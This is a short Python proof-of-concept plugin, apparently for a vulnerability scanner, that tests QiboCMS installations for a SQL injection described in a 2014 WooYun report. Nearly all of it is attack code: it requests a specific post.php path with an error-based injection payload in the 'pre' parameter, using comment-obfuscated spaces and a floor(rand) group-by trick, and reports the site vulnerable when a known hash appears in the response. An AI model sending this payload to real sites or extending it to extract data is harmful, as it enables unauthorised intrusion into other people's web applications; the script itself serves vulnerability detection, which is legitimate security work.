#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

"""
POC Name  :  QiboCMS sql injection
References:  http://www.wooyun.org/bugs/wooyun-2014-081428
Author    :  Dream
QQ        :  1045254752
"""

def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    url = arg + 'dan/qibodf/2shou/post.php'
    code, head, res, errcode, _ = curl.curl(url)
    if code ==200:
        code, head, res, errcode, _ = curl.curl(url + '?pre=qb_members/**/where/**/1/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat((select/**/md5(3.1415)),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)#')
        m = re.search('63e1f04640e83605c1d177544a5a0488',res)
        if m:
            security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])
